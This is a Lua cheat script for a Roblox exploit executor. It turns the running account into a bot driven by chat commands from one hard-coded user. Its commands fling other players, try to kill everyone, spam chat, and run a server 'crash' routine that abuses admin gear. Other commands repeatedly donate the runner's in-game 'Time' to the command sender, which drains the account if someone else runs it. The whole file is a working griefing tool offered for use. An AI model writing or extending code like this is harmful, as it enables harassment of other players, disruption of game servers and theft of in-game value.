local Key = "Xeno"
if _G.Key ~= Key then return end

local AllowedUser = "Noob1Noob667"
local Prefix = "."

local Say = "say"
local Loop = "loopsay"
local StopLoop = "stoploop"
local Dall = "dall"
local Adall = "adall"
local StopAdall = "stopadall"
local Silent = "silent"
local Fling = "fling"
local StopFling = "stopfling"
local Hide = "hide"
local StopHide = "stophide"
local Reset = "reset"
local Rejoin = "rejoin"
local AntiAfk = "antiafk"
local Crash = "crash"

local Players = game:GetService("Players")
local RepStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local loopActive, loopMsg = false, ""
local adallActive, adallAmt, adallDelay, adallTarget = false, 0, 1, ""
local silentMode = false
local flinging, flingTarget = false, ""
local hiding, hidePart, hidePos, returnPos = false, nil, Vector3.new(0,5000,0), nil
local antiAfkActive = false

-- (Loader GUI omitted for brevity – it's exactly the same as in previous messages)

local function isAllowed(player)
    return string.lower(player.Name) == string.lower(AllowedUser)
end

local function sendChat(msg)
    local text = msg
    if silentMode then text = string.gsub(text, "^;", "") end
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if ch then ch:SendAsync(text) return end
    end
    local cr = RepStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if cr then
        local sr = cr:FindFirstChild("SayMessageRequest")
        if sr then sr:FireServer(text, "All") return end
    end
    for _, r in ipairs(RepStorage:GetDescendants()) do
        if r:IsA("RemoteEvent") and string.find(string.lower(r.Name), "saymessage") then
            r:FireServer(text, "All")
            return
        end
    end
end

local function getTarget(text)
    if text == "me" then return LocalPlayer end
    local s = string.lower(text)
    for _, p in ipairs(Players:GetPlayers()) do
        if string.sub(string.lower(p.Name), 1, #s) == s or string.sub(string.lower(p.DisplayName), 1, #s) == s then
            return p
        end
    end
    return nil
end

local function getOwnTime()
    local stats = LocalPlayer:WaitForChild("leaderstats", 5)
    if stats then
        for _, v in ipairs(stats:GetChildren()) do
            if v:IsA("ValueBase") and v.Name == "Time" then return v end
        end
    end
    return nil
end

local function hasArkenstone()
    local c = LocalPlayer.Character
    local b = LocalPlayer:FindFirstChild("Backpack")
    return (c and c:FindFirstChild("The Arkenstone")) or (b and b:FindFirstChild("The Arkenstone"))
end

local function equipTool(toolName)
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then
        local t = bp:FindFirstChild(toolName)
        if t then t.Parent = char end
    end
    task.wait(0.4)
end

local function crashSequence()
    if not hasArkenstone() then return end
    equipTool("The Arkenstone")
    sendChat("gear 261439002")
    equipTool("The Arkenstone")
    sendChat("freeze a")
    sendChat("blind o")
    sendChat("bring a")
    for i = 1, 7 do sendChat("clone a") end
    equipTool("Winters Greatsword")
    task.wait(0.2)
    local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Winters Greatsword")
    if tool then
        local rem = tool:FindFirstChildOfClass("RemoteEvent") or tool:FindFirstChildOfClass("RemoteFunction")
        if rem then rem:FireServer("Ability") else tool:Activate() end
    end
end

task.spawn(function()
    while true do
        if loopActive and loopMsg ~= "" then sendChat(loopMsg) end
        task.wait(0.6)
    end
end)

task.spawn(function()
    while true do
        if adallActive and adallAmt > 0 and adallTarget ~= "" then
            sendChat(";donate " .. adallTarget .. " " .. adallAmt)
            task.wait(adallDelay)
        else
            task.wait(0.1)
        end
    end
end)

task.spawn(function()
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = Vector3.new(10000, 10000, 10000)
    RunService.Heartbeat:Connect(function()
        if flinging and flingTarget ~= "" then
            local myChar = LocalPlayer.Character
            local target = Players:FindFirstChild(flingTarget)
            if myChar and target and target.Character then
                local myRoot = myChar:FindFirstChild("HumanoidRootPart") or myChar:FindFirstChild("Torso")
                local targetRoot = target.Character:FindFirstChild("HumanoidRootPart") or target.Character:FindFirstChild("Torso")
                local hum = myChar:FindFirstChildOfClass("Humanoid")
                if myRoot and targetRoot and hum then
                    if hum.Sit then hum.Sit = false end
                    bv.Parent = myRoot
                    myRoot.CFrame = targetRoot.CFrame
                    for _, p in ipairs(myChar:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
                end
            end
        else
            if bv.Parent then bv.Parent = nil end
        end
    end)
end)

RunService.Heartbeat:Connect(function()
    if hiding then
        local char = LocalPlayer.Character
        if char then
            char:PivotTo(CFrame.new(hidePos + Vector3.new(0, 3, 0)))
        end
    end
end)

task.spawn(function()
    while true do
        if antiAfkActive then
            local char = LocalPlayer.Character
            if char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then hum.Jump = true end
            end
        end
        task.wait(30)
    end
end)

local function processCommand(sender, message)
    if not isAllowed(sender) then return end
    local msg = message:lower()
    if msg == Prefix .. AntiAfk then
        antiAfkActive = true
    elseif msg == Prefix .. AntiAfk .. " off" then
        antiAfkActive = false
    elseif msg == Prefix .. Crash then
        crashSequence()
    elseif msg == Prefix .. Silent then
        silentMode = not silentMode
    elseif msg == Prefix .. Rejoin then
        pcall(function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
    elseif msg == Prefix .. Reset then
        loopActive = false; loopMsg = ""; adallActive = false
        flinging = false; flingTarget = ""
        if hiding then
            hiding = false
            if hidePart then hidePart:Destroy(); hidePart = nil end
        end
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum.Health = 0 end
        end
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                local c = p.Character
                if c then
                    local h = c:FindFirstChildOfClass("Humanoid")
                    if h then h.Health = 0 end
                end
            end
        end
    elseif msg == Prefix .. Hide then
        if not hiding then
            local char = LocalPlayer.Character
            if char then
                returnPos = char:GetPivot()
                char:PivotTo(CFrame.new(hidePos + Vector3.new(0, 3, 0)))
            end
            hidePart = Instance.new("Part")
            hidePart.Size = Vector3.new(20, 1, 20)
            hidePart.Position = hidePos
            hidePart.Anchored = true
            hidePart.Parent = workspace
            hiding = true
        end
    elseif msg == Prefix .. StopHide then
        if hiding then
            hiding = false
            if hidePart then hidePart:Destroy(); hidePart = nil end
            local char = LocalPlayer.Character
            if char and returnPos then
                char:PivotTo(returnPos)
            end
        end
    elseif msg == Prefix .. StopFling then
        flinging = false; flingTarget = ""
    elseif string.sub(message, 1, #Prefix + #Say + 1) == Prefix .. Say .. " " then
        local text = string.sub(message, #Prefix + #Say + 2)
        if text ~= "" then sendChat(text) end
    elseif string.sub(message, 1, #Prefix + #Loop + 1) == Prefix .. Loop .. " " then
        local text = string.sub(message, #Prefix + #Loop + 2)
        if text ~= "" then loopMsg = text; loopActive = true end
    elseif msg == Prefix .. StopLoop then
        loopActive = false; loopMsg = ""; adallActive = false
    elseif msg == Prefix .. StopAdall then
        adallActive = false
    elseif msg == Prefix .. Dall then
        local t = getOwnTime()
        if t and t.Value > 1 then
            sendChat(";donate " .. sender.DisplayName .. " " .. (t.Value - 1))
        end
    elseif string.sub(message, 1, #Prefix + #Adall + 1) == Prefix .. Adall .. " " then
        local amt = tonumber(string.sub(message, #Prefix + #Adall + 2))
        if amt then
            adallAmt = amt
            adallDelay = amt + 1
            adallTarget = sender.DisplayName
            adallActive = true
        end
    elseif string.sub(message, 1, #Prefix + #Fling + 1) == Prefix .. Fling .. " " then
        local target = getTarget(string.sub(message, #Prefix + #Fling + 2))
        if target then
            flingTarget = target.Name
            flinging = true
        end
    end
end

local function hookPlayer(p)
    if p.Chatted then
        p.Chatted:Connect(function(m) processCommand(p, m) end)
    end
end

for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
Players.PlayerAdded:Connect(hookPlayer)

if TextChatService then
    TextChatService.MessageReceived:Connect(function(m)
        local sender = Players:GetPlayerByUserId(m.UserId)
        if sender then processCommand(sender, m.Text) end
    end)
end
